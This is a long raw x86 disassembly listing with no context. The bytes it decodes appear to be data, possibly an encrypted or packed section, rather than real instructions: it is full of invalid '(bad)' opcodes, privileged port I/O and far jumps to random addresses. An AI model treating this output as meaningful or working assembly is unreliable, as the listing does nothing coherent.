  4025c4:	lods   al,BYTE PTR ds:[esi]
  4025c5:	(bad)
  4025c8:	mov    ah,0xd9
  4025ca:	retf   0xe1b9
  4025cd:	inc    DWORD PTR [edx]
  4025cf:	(bad)  
  4025d0:	fucom  st(5)
  4025d2:	faddp  st(0),st
  4025d4:	(bad)
  4025d7:	call   0xc93408d6
  4025dc:	into   
  4025dd:	in     al,dx
  4025de:	retf   
  4025df:	loopne 0x4025cf
  4025e1:	cmc    
  4025e2:	mov    bh,0xb6
  4025e4:	mov    dl,0xe1
  4025e6:	(bad)  
  4025e7:	mov    dh,0xc5
  4025e9:	leave  
  4025ea:	icebp  
  4025eb:	sar    dh,cl
  4025ed:	loope  0x4025e8
  4025ef:	iret   
  4025f0:	sar    ah,1
  4025f2:	add    edi,esi
  4025f4:	(bad)  
  4025f5:	(bad)  
  4025f7:	fcmovne st,st(3)
  4025f9:	(bad)
  4025fc:	in     eax,0xe0
  4025fe:	int    0xc4
  402600:	leave  
  402601:	rcl    ah,cl
  402603:	int    0xac
  402605:	mov    ah,0xd3
  402607:	push   DWORD PTR [edi-0x11172b15]
  40260d:	add    eax,DWORD PTR [ebx]
  40260f:	mov    ebp,0xdefcf7f5
  402614:	repnz fmul DWORD PTR [edx]
  402617:	jecxz  0x4025d9
  402619:	fimul  WORD PTR [eax]
  40261b:	jmp    0xc9e5:0xe0b8bd02
  402622:	mov    cl,0xdb
  402624:	(bad)  
  402625:	shr    DWORD PTR [esi-0x220e4b3b],1
  40262b:	mov    edi,0xbce7f3d5
  402630:	(bad)  
  402631:	fndisi(8087 only) 
  402633:	aad    0xd7
  402635:	fld    QWORD PTR ds:0xdafee5c9
  40263b:	lds    eax,FWORD PTR [ecx]
  40263d:	stos   BYTE PTR es:[edi],al
  40263e:	mov    al,0xae
  402640:	loopne 0x402639
  402642:	jmp    0xf4330113
  402647:	shl    ch,cl
  402649:	mov    bh,0xf0
  40264b:	icebp  
  40264c:	in     al,dx
  40264d:	mov    edi,0xf2f5c2f0
  402652:	add    bl,ah
  402654:	jecxz  0x40262d
  402656:	retf   
  402657:	fimul  WORD PTR [edi]
  402659:	add    eax,0xcf13ee13
  40265e:	shl    DWORD PTR [edx-0x534d3733],1
  402664:	out    dx,al
  402665:	(bad)  
  402666:	iret   
  402667:	fldpi  
  402669:	fcmovu st,st(5)
  40266b:	rcl    bl,1
  40266d:	leave  
  40266e:	hlt    
  40266f:	hlt    
  402670:	add    al,al
  402672:	int3   
  402673:	(bad)  
  402674:	loopne 0x40264f
  402676:	xlat   BYTE PTR ds:[ebx]
  402677:	aam    0x0
  402679:	or     al,0xee
  40267b:	adc    bl,dl
  40267d:	stos   DWORD PTR es:[edi],eax
  40267e:	test   al,0xca
  402680:	(bad)  
  402681:	jmp    0xefe7:0xebd7ebad
  402688:	mov    bh,0xed
  40268a:	mov    esi,0xe8efd1e2
  40268f:	out    0xf6,eax
  402691:	add    BYTE PTR [edx-0x1df70647],bh
  402697:	(bad)  
  402699:	jmp    0xca520891
  40269e:	lods   al,BYTE PTR ds:[esi]
  40269f:	lods   al,BYTE PTR ds:[esi]
  4026a0:	int3   
  4026a1:	(bad)  
  4026a2:	in     al,0xf7
  4026a4:	(bad)  
  4026a5:	in     eax,0xb1
  4026a7:	stc    
  4026a8:	out    dx,eax
  4026a9:	std    
  4026aa:	mov    ecx,0xf3d0c8d1
  4026af:	push   es
  4026b0:	into   
  4026b1:	push   ecx
  4026b3:	in     al,0xf6
  4026b5:	icebp  
  4026b6:	(bad)  
  4026b7:	test   bh,0xe0
  4026ba:	in     eax,dx
  4026bb:	or     ebx,esp
  4026bd:	out    dx,al
  4026be:	(bad)  
  4026bf:	int    0xbc
  4026c1:	mov    esp,0xf9c1e4ef
  4026c6:	neg    cl
  4026c8:	mov    edi,0xbefed8bb
  4026cd:	idiv   BYTE PTR [eax-0x2a01fd1d]
  4026d3:	jmp    0xe3e1:0xefd0deb8
  4026da:	leave  
  4026db:	jmp    0x4026ab
  4026dd:	shl    bl,0xe3
  4026e0:	jmp    0xfad1:0xd3b3e7d5
  4026e7:	mov    edx,0xcafef3f8
  4026ec:	lock mov ebx,0xd5f5f9e7
  4026f2:	test   ah,0xc1
  4026f5:	(bad)  
  4026f6:	mov    DWORD PTR ds:0xe4e4da0b,0xdcefe3e6
  402700:	test   al,0xef
  402703:	(bad)  
  402704:	retf   
  402705:	fdiv   st,st(1)
  402707:	mov    ecx,0xf0fdf7df
  40270c:	add    esi,edx
  40270e:	(bad)  
  402710:	fnstcw WORD PTR [edi-0x723f806]
  402716:	ffree  st(0)
  402718:	mov    esp,0xff010f0a
  40271d:	jmp    0xc7050d02
  402722:	ror    edi,1
  402724:	(bad)  
  402725:	out    0xd3,eax
  402727:	(bad)  
  402729:	jmp    0xf2df:0xdbf6bffd
  402730:	fucom  st(0)
  402732:	loop   0x4026ed
  402734:	(bad)
  402737:	(bad)  
  402738:	cli    
  402739:	jmp    0xe7300b3a
  40273e:	mov    cl,0xe0
  402740:	scas   eax,DWORD PTR es:[edi]
  402741:	cmc    
  402742:	aam    0xbb
  402744:	(bad)  
  402745:	xlat   BYTE PTR ds:[ebx]
  402746:	sar    DWORD PTR [eax+0x2eef2e6],1
  40274c:	ret    
  40274d:	push   esi
  40274f:	jecxz  0x40274c
  402751:	out    0xd7,al
  402753:	(bad)  
  402755:	aad    0xca
  402757:	retf   0xdac9
  40275a:	iret   
  40275b:	loopne 0x40276b
  40275d:	shr    DWORD PTR [ebp-0xd3d282d],1
  402763:	jmp    0x402730
  402765:	in     al,dx
  402766:	in     eax,dx
  402767:	mov    cl,0xe5
  402769:	rcl    ah,1
  40276b:	sti    
  40276c:	jmp    0xc1c7:0xb8decefc
  402773:	jecxz  0x402739
  402775:	in     al,0xe2
  402777:	aad    0xcf
  402779:	jmp    0x402768
  40277b:	add    edx,DWORD PTR [ecx]
  40277d:	mov    eax,0xc5ddeab0
  402782:	rol    ch,1
  402784:	repz (bad) 
  402786:	mov    eax,0xf0f9cdf1
  40278b:	into   
  40278c:	lock loopne 0x402787
  40278f:	mov    ecx,0xf1e6bdda
  402794:	add    cl,al
  402796:	jmp    0x402771
  402798:	into   
  402799:	out    0xdd,al
  40279b:	(bad)  [edi]
  40279d:	iret   
  40279e:	mov    bl,0xce
  4027a0:	out    0xe0,eax
  4027a2:	not    al
  4027a4:	loop   0x402761
  4027a6:	sti    
  4027a7:	aad    0xf2
  4027a9:	mov    ebp,0xf9d8d3cc
  4027ae:	mov    esi,0xf1d6e2df
  4027b3:	aad    0x7
  4027b5:	retf   0xdfe9
  4027b8:	iret   
  4027b9:	(bad)
  4027bc:	push   cs
  4027bd:	jmp    0xc1fb:0xd0e0c0ce
  4027c4:	lock mov cl,0xb6
  4027c7:	in     al,dx
  4027c8:	mov    ecx,0xc8d8b9dc
  4027cd:	add    bl,bl
  4027cf:	shl    dl,1
  4027d1:	push   es
  4027d2:	sar    edi,0xd6
  4027d5:	or     ecx,DWORD PTR [eax]
  4027d7:	aad    0xfd
  4027d9:	jecxz  0x4027a4
  4027db:	or     DWORD PTR [esi],eax
  4027dd:	test   eax,0xf2c8f0c4
  4027e2:	mov    al,0xd7
  4027e4:	ret    0xb7e1
  4027e7:	mov    ah,0xfd
  4027e9:	idiv   BYTE PTR [ebp-0xfff4112]
  4027ef:	(bad)  
  4027f0:	stc    
  4027f1:	faddp  st(1),st
  4027f3:	or     al,BYTE PTR [edx]
  4027f5:	aad    0xe0
  4027f7:	(bad)  
  4027f8:	in     eax,0xff
  4027fa:	jmp    0xd0f3:0xb2d3d3cf
  402801:	repz enter 0xacd2,0xb3
  402806:	vpslld ymm2,ymm7,xmm1
  40280a:	fstp   TBYTE PTR [edx-0x24180017]
  402810:	icebp  
  402811:	pop    es
  402812:	rcl    bl,1
  402814:	add    DWORD PTR [eax],ecx
  402816:	fcmovnb st,st(7)
  402818:	jmp    0xbcc7:0xeecbe2e3
  40281f:	shl    ebp,cl
  402821:	repz call 0xd7121c0d
  402827:	mov    cl,0xe5
  402829:	imul   ah
  40282b:	sar    DWORD PTR [ebp-0x23293800],cl
  402831:	(bad)  
  402832:	aam    0xdc
  402834:	(bad)  [ecx]
  402836:	or     BYTE PTR [eax+edi*8],al
  402839:	dec    DWORD PTR [edi]
  40283b:	fisttp WORD PTR [edx]
  40283d:	rcr    esi,cl
  40283f:	loopne 0x4027fd
  402841:	loopne 0x4027ed
  402843:	(bad)  
  402845:	clc    
  402846:	in     al,dx
  402847:	(bad)  
  402848:	clc    
  402849:	shr    bh,1
  40284b:	mov    esi,0xe0bfb7f6
  402850:	(bad)  
  402851:	(bad)  
  402853:	mov    esp,0xd6eafae9
  402858:	pop    es
  402859:	mov    BYTE PTR [ecx],0xfb
  40285c:	out    0xc1,al
  40285e:	shr    dh,1
  402860:	ffree  st(6)
  402862:	sar    DWORD PTR [ebx-0x2b382c26],1
  402868:	in     eax,0xfa
  40286a:	in     al,dx
  40286b:	call   0xc8192840
  402870:	loope  0x40286c
  402872:	(bad)  
  402874:	(bad)  
  402875:	loope  0x402881
  402877:	or     ecx,ebx
  402879:	out    0xec,al
  40287b:	push   cs
  40287c:	add    bh,BYTE PTR [ecx-0x12411a50]
  402882:	lods   eax,DWORD PTR ds:[esi]
  402883:	xlat   BYTE PTR ds:[ebx]
  402884:	mov    dh,0xf6
  402886:	mov    ah,0xf6
  402888:	shr    ebx,1
  40288a:	sar    eax,cl
  40288c:	mov    al,0xf5
  40288e:	add    DWORD PTR [edx],eax
  402890:	push   es
  402891:	add    ah,bl
  402893:	fdiv   st(1),st
  402895:	(bad)  
  402897:	push   cs
  402898:	dec    ecx
  40289a:	loop   0x40287c
  40289c:	jmp    0xc4b1:0xbecfc5d0
  4028a3:	mov    cl,0xca
  4028a5:	mov    bh,0xb7
  4028a7:	jmp    0xe01b197e
  4028ac:	cld    
  4028ad:	mov    ecx,0x200f0c8
  4028b2:	repz (bad) 
  4028b4:	fsub   st,st(7)
  4028b6:	jecxz  0x40289d
  4028b8:	or     bh,cl
  4028ba:	in     eax,0xc4
  4028bc:	int3   
  4028bd:	mov    edi,0xd1a4c5bd
  4028c2:	lods   al,BYTE PTR ds:[esi]
  4028c3:	out    0xb3,al
  4028c5:	(bad)  
  4028c6:	cmc    
  4028c7:	mul    ch
  4028c9:	(bad)  
  4028cb:	add    cl,ch
  4028cd:	ret    
  4028ce:	mov    esi,0xe1fff5da
  4028d3:	fstp   st(7)
  4028d5:	or     DWORD PTR [edi],eax
  4028d7:	jmp    0xe52b07da
  4028dc:	(bad)  
  4028dd:	stos   BYTE PTR es:[edi],al
  4028de:	jmp    0xb20107a2
  4028e3:	out    0xf3,eax
  4028e5:	repz retf 
  4028e7:	mov    eax,0xdfb8d0cf
  4028ec:	call   0xdc4715c7
  4028f1:	rcl    esi,cl
  4028f3:	xlat   BYTE PTR ds:[ebx]
  4028f4:	jmp    0xeb002ff4
  4028f9:	loope  0x402900
  4028fb:	fild   WORD PTR [esi]
  4028fd:	int3   
  4028fe:	mov    cl,0xd1
  402900:	int3   
  402901:	in     eax,0xe8
  402903:	shl    DWORD PTR [eax-0x49444e51],1
  402909:	fsub   st(6),st
  40290b:	retf   0xc1f9
  40290e:	out    0xd6,eax
  402910:	add    ah,dh
  402912:	idiv   bh
  402914:	(bad)  
  402916:	loope  0x4028f3
  402918:	add    al,0xfe
  40291a:	(bad)  
  40291b:	fxch   st(4)
  40291d:	int    0xa9
  40291f:	(bad)  
  402920:	in     al,dx
  402921:	(bad)  
  402923:	lods   eax,DWORD PTR ds:[esi]
  402924:	fcmovnbe st,st(1)
  402926:	in     eax,0xcb
  402928:	jmp    0xfc0e0802
  40292d:	shl    dh,cl
  40292f:	out    dx,eax
  402930:	mov    eax,0xebe5ddf6
  402935:	in     eax,0xea
  402937:	or     ah,dh
  402939:	add    edx,eax
  40293b:	add    eax,0xc8b0cedd
  402940:	(bad)  
  402941:	mov    dh,0xf0
  402943:	iret   
  402944:	call   0xcf1c001f
  402949:	fmul   st(4),st
  40294b:	(bad)  
  40294d:	aad    0xbe
  40294f:	(bad)  
  402950:	mov    eax,0x4f9dbf3
  402955:	retf   0xdbc7
  402958:	loope  0x402921
  40295a:	cld    
  40295b:	adc    edi,ecx
  40295d:	fdivr  st(3),st
  40295f:	mov    ebp,0xacb0e7cb
  402964:	in     eax,dx
  402965:	aad    0xcb
  402967:	shl    al,1
  402969:	mov    edi,0xc1fdbfbd
  40296e:	rcl    ah,0xf8
  402971:	add    ah,bl
  402973:	sti    
  402974:	cld    
  402975:	call   0x53a0764
  40297a:	or     al,0xcd
  40297c:	fxch   st(0)
  40297e:	ret    
  40297f:	in     al,0xae
  402981:	out    dx,eax
  402982:	scas   al,BYTE PTR es:[edi]
  402983:	mov    ch,0xe9
  402985:	mov    dh,0xba
  402987:	in     al,dx
  402988:	jmp    0xe7bc:0xbfecd4b7
  40298f:	lock ror ebp,cl
  402992:	jmp    0x40298b
  402994:	ret    
  402995:	cmc    
  402996:	ffreep st(0)
  402998:	pop    es
  402999:	cmc    
  40299a:	fcmove st,st(5)
  40299c:	jmp    0xfbb6:0xe4f3d7a9
  4029a3:	mov    bl,0xef
  4029a5:	shl    bh,cl
  4029a7:	call   0xd017ee65
  4029ac:	add    ecx,edi
  4029ae:	mov    ebp,0xd1f5eedb
  4029b3:	(bad)  [edx]
  4029b5:	(bad)  
  4029b7:	fcmovne st,st(0)
  4029b9:	sti    
  4029ba:	in     eax,0xe3
  4029bc:	leave  
  4029bd:	(bad)
  4029c1:	mov    ch,0xb5
  4029c3:	ror    ecx,1
  4029c5:	fdivr  st,st(2)
  4029c7:	mov    eax,0xfbb9cce8
  4029cc:	out    dx,al
  4029cd:	mov    ecx,0xf1fde2cf
  4029d2:	out    0xdc,al
  4029d4:	add    ah,cl
  4029d6:	retf   
  4029d7:	in     al,0xc9
  4029d9:	std    
  4029da:	retf   
  4029db:	into   
  4029dc:	shr    eax,cl
  4029de:	in     eax,dx
  4029df:	repnz out dx,al
  4029e1:	out    0xfb,eax
  4029e3:	int    0xca
  4029e5:	(bad)  
  4029e6:	leave  
  4029e7:	clc    
  4029e8:	mov    ah,0xca
  4029ea:	cli    
  4029eb:	out    dx,al
  4029ec:	jecxz  0x4029d7
  4029ee:	mov    ecx,0xc7e405ef
  4029f3:	mov    ecx,0xe9f0f1db
  4029f8:	leave  
  4029f9:	fiadd  WORD PTR ds:0xbdc6eeeb
  4029ff:	les    esi,FWORD PTR [esi-0x1719372a]
  402a05:	rcr    cl,cl
  402a07:	fstp   TBYTE PTR [esi-0x3244d09]
  402a0d:	fstp   st(5)
  402a0f:	idiv   BYTE PTR [esi+eiz*8-0x161afb22]
  402a16:	mov    esi,0xfecfeae0
  402a1b:	or     eax,0xe3e7b9f1
  402a20:	jmp    0xb5e4:0xc4b6c8f6
  402a27:	sar    DWORD PTR [ecx-0x20234227],1
  402a2d:	repz aad 0xf6
  402a30:	add    ah,bh
  402a32:	ret    0xfcd8
  402a35:	add    eax,0xd5e4e4f6
  402a3a:	jmp    0xe2c3:0xc4ea04ed
  402a41:	retf   
  402a42:	(bad)  
  402a43:	fcmovne st,st(7)
  402a45:	cmc    
  402a46:	mov    cl,0xd7
  402a48:	rcr    ah,1
  402a4a:	mov    esp,0xf2fdbcb1
  402a4f:	fdivp  st(5),st
  402a51:	(bad)  
  402a53:	(bad)  
  402a54:	sti    
  402a55:	fucom  st(0)
  402a57:	aad    0xca
  402a59:	fld    st(5)
  402a5b:	(bad)  
  402a5c:	shl    dh,cl
  402a5e:	mov    edi,0xd1bddeb1
  402a63:	out    0xf9,al
  402a65:	shl    edi,cl
  402a67:	(bad)
  402a6a:	hlt    
  402a6b:	sti    
  402a6c:	std    
  402a6d:	fcomip st,st(1)
  402a6f:	(bad)  
  402a71:	fdivp  st(5),st
  402a73:	fcmovu st,st(1)
  402a75:	add    ah,dh
  402a77:	sti    
  402a78:	cmc    
  402a79:	loopne 0x402a84
  402a7b:	or     DWORD PTR [ecx],eax
  402a7d:	call   0xcf1d224d
  402a82:	retf   0xe4ce
  402a85:	jmp    0xbfcf:0xdbedcbe7
  402a8c:	out    dx,eax
  402a8d:	aad    0xce
  402a8f:	(bad)  
  402a90:	(bad)  
  402a91:	cli    
  402a92:	stc    
  402a93:	(bad)  
  402a95:	ret    
  402a96:	leave  
  402a97:	mov    ebp,0xf904dae9
  402a9c:	add    al,0xe5
  402a9e:	jmp    0x402a5e
  402aa0:	rcl    ch,0xb6
  402aa3:	mov    cl,0xd3
  402aa5:	fucomi st,st(5)
  402aa7:	clc    
  402aa8:	int    0xcc
  402aaa:	int3   
  402aab:	in     eax,dx
  402aac:	cmc    
  402aad:	loopne 0x402ab2
  402aaf:	clc    
  402ab0:	(bad)  
  402ab1:	fnstsw ax
  402ab3:	jmp    ecx
  402ab5:	add    al,0x5
  402ab7:	psubusb mm0,mm7
  402aba:	bswap  esi
  402abc:	loop   0x402a8b
  402abe:	ffree  st(0)
  402ac0:	loop   0x402a89
  402ac2:	fadd   st(3),st
  402ac4:	shl    edi,1
  402ac6:	call   0xc52000a5
  402acb:	shr    esp,1
  402acd:	in     al,dx
  402ace:	in     eax,dx
  402acf:	lock fsqrt 
  402ad2:	ret    0xfbc4
  402ad5:	jecxz  0x402a9c
  402ad7:	or     bh,ch
  402ad9:	(bad)  
  402ada:	fsub   st,st(5)
  402adc:	(bad)  
  402ade:	fdivr  DWORD PTR [esi-0x244c0e24]
  402ae4:	rcl    ah,cl
  402ae6:	in     eax,0xf0
  402ae8:	enter  0xf2da,0xff
  402aec:	mov    edi,0xe301daf6
  402af1:	aad    0xf5
  402af3:	push   es
  402af4:	rol    cl,0x8
  402af7:	rol    DWORD PTR [ecx],0x7
  402afa:	pinsrw mm7,ebp,0xd9
  402afe:	jecxz  0x402ad0
  402b00:	xlat   BYTE PTR ds:[ebx]
  402b01:	out    dx,al
  402b02:	lods   eax,DWORD PTR ds:[esi]
  402b03:	mov    ebx,0xc8ebb4c8
  402b08:	iret   
  402b09:	cmc    
  402b0a:	(bad)  
  402b0b:	cmc    
  402b0c:	aam    0xcc
  402b0e:	xlat   BYTE PTR ds:[ebx]
  402b0f:	shl    ebx,cl
  402b11:	in     eax,0x5
  402b13:	mov    esp,0xc6c201dd
  402b18:	into   
  402b19:	or     al,0xfe
  402b1b:	(bad)
  402b1f:	shl    BYTE PTR [ebp+ebp*8-0x2d112b53],cl
  402b26:	aam    0xd5
  402b28:	mov    eax,0xcfd1ead7
  402b2d:	add    eax,eax
  402b2f:	out    dx,eax
  402b30:	int3   
  402b31:	add    ebp,ebx
  402b33:	(bad)  
  402b35:	cld    
  402b36:	add    eax,edi
  402b38:	out    0xda,eax
  402b3a:	jmp    0xadea0420
  402b3f:	loope  0x402b07
  402b41:	cmc    
  402b42:	bnd call 0xf509f713
  402b48:	mov    edx,0xf6fbb4b8
  402b4d:	loop   0x402b05
  402b4f:	int3   
  402b50:	stc    
  402b51:	(bad)  
  402b53:	mov    ebp,0xf902d4e2
  402b58:	cmc    
  402b59:	jmp    0xaa20345f
  402b5e:	in     eax,0xd7
  402b60:	mov    dl,0xe4
  402b62:	shr    bh,1
  402b64:	mov    edx,0xeed6d3c6
  402b69:	cld    
  402b6a:	mov    eax,0xdcd1ecf2
  402b6f:	stc    
  402b70:	clc    
  402b71:	rcl    bh,1
  402b73:	mov    DWORD PTR ds:0xf6d60fc5,0xc4eee1ea
  402b7d:	mov    dl,0xe5
  402b7f:	test   eax,0xecb0d4d6
  402b84:	lods   al,BYTE PTR ds:[esi]
  402b85:	mov    cl,0xf3
  402b87:	fucomi st,st(7)
  402b89:	fsub   st(5),st
  402b8b:	aad    0xc3
  402b8d:	mov    ebx,0x7c2bcee
  402b92:	repnz (bad) 
  402b96:	hlt    
  402b97:	iret   
  402b98:	in     eax,dx
  402b99:	jecxz  0x402b82
  402b9b:	or     al,0xf1
  402b9d:	icebp  
  402b9e:	fucom  st(4)
  402ba0:	jmp    0xeaf4:0xe7d1d3e9
  402ba7:	out    0xd2,eax
  402ba9:	stc    
  402baa:	hlt    
  402bab:	lock aam 0xc3
  402bae:	rol    bl,0xe3
  402bb1:	add    al,0xc4
  402bb3:	clc    
  402bb4:	xlat   BYTE PTR ds:[ebx]
  402bb5:	(bad)
  402bb8:	clc    
  402bb9:	out    dx,eax
  402bba:	cli    
  402bbb:	repz shl bl,cl
  402bbe:	mov    esi,0xe7ebd2c3
  402bc3:	lods   al,BYTE PTR ds:[esi]
  402bc4:	into   
  402bc5:	idiv   DWORD PTR [eax-0x3b372426]
  402bcb:	in     al,dx
  402bcc:	iret   
  402bcd:	jmp    0xda3d2dc4
  402bd2:	in     al,dx
  402bd3:	out    0xc7,al
  402bd5:	(bad)  
  402bd6:	(bad)  
  402bd7:	(bad)  
  402bd9:	fxch   st(2)
  402bdb:	add    eax,0xadc7de08
  402be0:	rol    edi,1
  402be2:	repz into 
  402be4:	out    dx,al
  402be5:	(bad)  
  402be6:	loopne 0x402bd6
  402be8:	clc    
  402be9:	icebp  
  402bea:	jmp    0xc3212fc8
  402bef:	icebp  
  402bf0:	(bad)  
  402bf1:	(bad)
  402bf4:	hlt    
  402bf5:	fdiv   st(5),st
  402bf7:	jecxz  0x402bfb
  402bf9:	or     eax,0xcadcffcb
  402bfe:	fsubr  st(7),st
  402c00:	repz lock mov dh,0xc0
  402c04:	repnz (bad) 
  402c06:	out    dx,al
  402c07:	aam    0xd9
  402c09:	stc    
  402c0a:	into   
  402c0b:	fadd   QWORD PTR [edx]
  402c0d:	mov    ecx,0x1f0fdb6
  402c12:	div    ch
  402c14:	or     al,ch
  402c16:	or     BYTE PTR [eax],cl
  402c18:	or     eax,0xf10d060a
  402c1d:	into   
  402c1e:	in     al,dx
  402c1f:	idiv   DWORD PTR [ebp-0x1e1e434d]
  402c25:	out    dx,al
  402c26:	(bad)  
  402c27:	iret   
  402c28:	fcmovbe st,st(6)
  402c2a:	les    eax,FWORD PTR [ebx]
  402c2c:	jmp    0xd201:0xd6fcc3c2
  402c33:	loope  0x402c36
  402c35:	sti    
  402c36:	fsubrp st(2),st
  402c38:	(bad)  
  402c3a:	add    BYTE PTR [ecx+ecx*1],al
  402c3d:	enter  0xcce2,0xde
  402c41:	jmp    0xf7cd:0xced5e5e3
  402c48:	aam    0xca
  402c4a:	mov    ecx,0xfdf3ccd8
  402c4f:	rol    edi,0xfd
  402c52:	ret    0xd8da
  402c55:	add    dh,ah
  402c57:	or     dh,dh
  402c59:	in     al,0xe5
  402c5b:	in     al,dx
  402c5c:	(bad)  
  402c5d:	in     al,dx
  402c5e:	into   
  402c5f:	sar    DWORD PTR [esp+eax*8-0x19314e3f],0xc0
  402c67:	aam    0xeb
  402c69:	repnz enter 0xf2ce,0xc2
  402c6e:	add    DWORD PTR [eax],eax
  402c70:	aad    0xfb
  402c72:	ror    DWORD PTR [edx],0xff
  402c75:	std    
  402c76:	call   0xc8482938
  402c7b:	repz clc 
  402c7d:	(bad)
  402c80:	rcr    ebp,1
  402c82:	loop   0x402c76
  402c84:	rcl    bh,1
  402c86:	repz mov eax,0xd9bbc5d8
  402c8c:	ror    ebp,1
  402c8e:	ror    bh,1
  402c90:	sar    DWORD PTR [edi-0x20b1c34],cl
  402c96:	(bad)  
  402c97:	retf   0xcac6
  402c9a:	add    cl,BYTE PTR [eax]
  402c9c:	add    eax,esp
  402c9e:	ret    
  402c9f:	mov    cl,0xf7
  402ca1:	jecxz  0x402c64
  402ca3:	mov    dh,0xe7
  402ca5:	shl    DWORD PTR [esi-0x44401239],0xf0
  402cac:	cmc    
  402cad:	stc    
  402cae:	out    0xc0,eax
  402cb0:	out    dx,al
  402cb1:	add    ebp,esi
  402cb3:	sti    
  402cb4:	aad    0xd4
  402cb6:	add    al,0xd6
  402cb8:	enter  0x104,0xde
  402cbc:	out    0xb3,eax
  402cbe:	test   eax,0xd6b5ddcc
  402cc3:	ret    0xd2ce
  402cc6:	int    0xfb
  402cc8:	lock in eax,dx
  402cca:	cld    
  402ccb:	jmp    0x402ccc
  402ccd:	hlt    
  402cce:	int3   
  402ccf:	fdivr  st(3),st
  402cd1:	(bad)  
  402cd2:	in     al,0xfb
  402cd4:	fcmovnbe st,st(7)
  402cd6:	fdivp  st(1),st
  402cd8:	fsubr  st(1),st
  402cda:	or     eax,0xc4cdccf3
  402cdf:	repz shl bl,cl
  402ce2:	(bad)  
  402ce3:	iret   
  402ce4:	mov    ch,0xdb
  402ce6:	clc    
  402ce7:	out    dx,al
  402ce8:	shr    ah,cl
  402cea:	enter  0xbff2,0xba
  402cee:	rcl    ch,0xff
  402cf1:	(bad)  
  402cf2:	repz loop 0x402cf5
  402cf5:	fiadd  WORD PTR [edx]
  402cf7:	loop   0x402cef
  402cf9:	fxch   st(7)
  402cfb:	push   es
  402cfc:	out    dx,al
  402cfd:	enter  0xc4d7,0xea
  402d01:	mov    ebp,0xf3c9ece1
  402d06:	aam    0xf8
  402d08:	int3   
  402d09:	icebp  
  402d0a:	(bad)  
  402d0c:	fild   WORD PTR [edx]
  402d0e:	into   
  402d0f:	ret    
  402d10:	mov    eax,0xe4f0fcf3
  402d15:	push   es
  402d16:	in     eax,0xe8
  402d18:	clc    
  402d19:	or     cl,BYTE PTR [esi]
  402d1b:	retf   0xcc0e
  402d1e:	in     al,0xc2
  402d20:	shl    cl,0xdb
  402d23:	out    0xe4,eax
  402d25:	(bad)  
  402d26:	(bad)  
  402d27:	cli    
  402d28:	ror    bh,cl
  402d2a:	jmp    0xf4fa:0xb9e3c8f6
  402d31:	add    ebp,esp
  402d33:	xlat   BYTE PTR ds:[ebx]
  402d34:	std    
  402d35:	fdivr  st,st(3)
  402d37:	push   cs
  402d38:	in     eax,0xd
  402d3a:	int3   
  402d3b:	cli    
  402d3c:	enter  0xe3be,0xdf
  402d40:	into   
  402d41:	out    0xc5,eax
  402d43:	iret   
  402d44:	hlt    
  402d45:	out    dx,al
  402d46:	retf   
  402d47:	in     eax,dx
  402d48:	out    dx,al
  402d49:	in     al,dx
  402d4a:	mov    esp,0xf1beccb5
  402d4f:	(bad)  
  402d50:	cli    
  402d51:	repz fsqrt 
  402d54:	aad    0xc4
  402d56:	frndint 
  402d58:	or     eax,0xfee0c20d
  402d5d:	into   
  402d5e:	(bad)  
  402d5f:	out    dx,al
  402d60:	in     eax,dx
  402d61:	(bad)  
  402d62:	enter  0xd4d6,0xf5
  402d66:	icebp  
  402d67:	xlat   BYTE PTR ds:[ebx]
  402d68:	iret   
  402d69:	mov    edi,0xe3bdc3e8
  402d6e:	rol    BYTE PTR [esi],cl
  402d70:	into   
  402d71:	fld    st(7)
  402d73:	dec    bl
  402d75:	retf   0xfb09
  402d78:	cli    
  402d79:	out    dx,eax
  402d7a:	or     DWORD PTR [edi],ecx
  402d7c:	in     eax,0xe6
  402d7e:	out    dx,eax
  402d7f:	shl    edi,1
  402d81:	jecxz  0x402d3a
  402d83:	mov    dh,0xc4
  402d85:	mov    edx,0xd0d2f7c7
  402d8a:	into   
  402d8b:	iret   
  402d8c:	jecxz  0x402d48
  402d8e:	add    ebx,edx
  402d90:	(bad)  
  402d91:	mov    esp,0xc6e5e7d9
  402d96:	retf   0xefd6
  402d99:	aam    0xc8
  402d9b:	out    dx,eax
  402d9c:	or     eax,0xe8dfa6e1
  402da1:	hlt    
  402da2:	scas   al,BYTE PTR es:[edi]
  402da3:	mov    ebx,0xd3d5e5c7
  402da8:	mov    ecx,0xccfdcef0
  402dad:	cmc    
  402dae:	jecxz  0x402d9d
  402db0:	int    0xd3
  402db2:	fisttp WORD PTR [ebx]
  402db4:	rol    ebx,0xd4
  402db7:	clc    
  402db8:	test   BYTE PTR ds:0xaddd04e7,0xb2
  402dbf:	jmp    0x402d96
  402dc1:	repz mov ah,0xf4
  402dc4:	repz shl DWORD PTR [ebp-0x302e2e14],1
  402dcb:	mov    ebx,0xfccec8ca
  402dd0:	rol    BYTE PTR [eax],1
  402dd2:	fadd   st(7),st
  402dd4:	cli    
  402dd5:	test   BYTE PTR [esi],0xf5
  402dd8:	in     eax,0xde
  402dda:	retf   
  402ddb:	add    DWORD PTR [ebx],eax
  402ddd:	fmulp  st(2),st
  402ddf:	mov    esi,0xc7d5d2bc
  402de4:	loop   0x402d96
  402de6:	mov    ecx,0x3e5f7f9
  402deb:	aad    0xf0
  402ded:	stc    
  402dee:	(bad)  
  402def:	int    0xf8
  402df1:	push   es
  402df2:	or     esi,ebx
  402df4:	loop   0x402df9
  402df6:	jmp    0x7ed:0xd8e5e4bd
  402dfd:	(bad)
  402e01:	scas   eax,DWORD PTR es:[edi]
  402e02:	shr    dl,1
  402e04:	shl    edx,0xc7
  402e07:	mov    ecx,0xf8d9edf3
  402e0c:	enter  0xe3c8,0xf8
  402e10:	push   es
  402e11:	aam    0xc4
  402e13:	ret    
  402e14:	jmp    0x402dd9
  402e16:	fsubrp st(5),st
  402e18:	leave  
  402e19:	in     eax,0xdc
  402e1b:	(bad)  
  402e1c:	fadd   st(1),st
  402e1e:	out    0xf0,eax
  402e20:	in     eax,0xd3
  402e22:	fadd   st(2),st
  402e24:	(bad)  
  402e26:	loopne 0x402dd5
  402e28:	in     al,0xe5
  402e2a:	fldl2e 
  402e2c:	icebp  
  402e2d:	enter  0xc000,0xc3
  402e31:	clc    
  402e32:	mov    ebp,0xe3e402f6
  402e37:	aad    0xd9
  402e39:	out    0x8,eax
  402e3b:	jmp    0xd81cfe42
  402e40:	ret    
  402e41:	loop   0x402df6
  402e43:	repnz (bad) 
  402e47:	aam    0xfe
  402e49:	in     al,dx
  402e4a:	in     al,dx
  402e4b:	cmc    
  402e4c:	aad    0xfb
  402e4e:	ret    
  402e4f:	hlt    
